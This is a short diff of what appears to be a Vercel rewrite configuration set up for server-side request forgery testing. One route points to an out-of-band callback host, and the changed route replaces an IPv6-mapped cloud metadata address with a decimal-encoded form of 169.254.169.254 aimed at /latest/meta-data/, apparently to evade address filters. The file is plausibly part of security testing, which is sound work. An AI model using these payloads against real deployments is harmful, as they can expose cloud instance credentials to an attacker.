@@ -5,8 +5,8 @@
       "destination": "http://vercel-ssrf-test.rccfgkxjzxqnwrexlhabvhw3ew2wq9fbg.oast.fun/"
     },
     {
-      "source": "/ssrf-ipv6",
-      "destination": "http://[::ffff:169.254.169.254]/latest/meta-data/"
+      "source": "/ssrf-decimal",
+      "destination": "http://2852039166/latest/meta-data/"
     }
   ]
 }
